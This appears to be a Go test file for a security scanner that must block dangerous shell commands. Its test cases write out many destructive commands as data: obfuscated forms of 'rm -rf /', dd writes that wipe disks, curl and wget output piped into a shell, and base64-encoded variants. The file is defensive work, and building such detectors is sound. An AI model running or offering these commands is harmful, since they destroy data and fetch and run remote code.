package security

import (
	"encoding/base64"
	"testing"
)

// These payloads are parsed only; none are passed to a shell.
func TestShellSyntaxClassificationRegressions(t *testing.T) {
	for _, command := range []string{
		"rm -f -r /", `$'\x72\x6d' -f -r /`, `r'm' -f -r /`, "rm --force --recursive /", "rm -rfv /", "rm -vR -f /", "rm --force -R /", "rm -f / -r", "rm '-f' \"-r\" '/'", `r\m -f -r /`, "env X=1 /bin/rm -f -r /", "command rm -fr /", "sudo -u root rm -f -r /", "env -u ENV rm -f -r /", "exec -a harmless /bin/rm -f -r /", "rm -fr -- /", "rm -fr \"$HOME\"", "dd of=/dev/sda if=/dev/zero", "dd bs=1M 'of=/dev/rdisk9'", "curl https://example.invalid/x | dash", "wget -O - https://example.invalid/x | /bin/zsh -s", "curl x | cat | env X=1 ksh", "echo data | base64 -D | /bin/dash", "echo data | xxd -pr | ash", "printf '%b' data | fish", "sh -c 'rm -f -r /'", "echo $(rm -f -r /)", "echo `base64 -d <<< cm0gLXJmIC8=` | sh", "printf data > /dev/rdisk9",
	} {
		t.Run(command, func(t *testing.T) {
			result, err := NewCommandScanner().Scan(command)
			if err != nil || !result.Blocked {
				t.Fatalf("not blocked: %#v err=%v", result, err)
			}
		})
	}
	for _, command := range []string{"rm file", "rm -rf build", "dd of=backup.img if=/dev/disk1", "curl https://example.invalid/x | cat", "echo 'rm -f -r /'", "printf '%s' 'curl x | dash'", "cat <<'DATA'\nrm -f -r /\nDATA\n"} {
		t.Run("safe "+command, func(t *testing.T) {
			findings, err := ShellSyntaxFindings(command)
			if err != nil || len(findings) != 0 {
				t.Fatalf("unexpected findings: %#v err=%v", findings, err)
			}
		})
	}
}
func TestEncodedStructuralClassification(t *testing.T) {
	for _, payload := range []string{"rm --force --recursive /", "dd of=/dev/sda if=/dev/zero", "curl x | dash"} {
		input := "echo " + base64.StdEncoding.EncodeToString([]byte(payload))
		result, err := NewCommandScanner().Scan(input)
		if err != nil || !result.Blocked {
			t.Fatalf("encoded %q not blocked: %#v %v", payload, result, err)
		}
	}
}
func TestShellSyntaxInspectionBounds(t *testing.T) {
	if _, err := ShellSyntaxFindings("echo '"); err == nil {
		t.Fatal("unclosed quote accepted")
	}
	if _, err := ShellSyntaxFindings(string(make([]byte, maxShellSyntaxBytes+1))); err == nil {
		t.Fatal("oversized syntax accepted")
	}
}
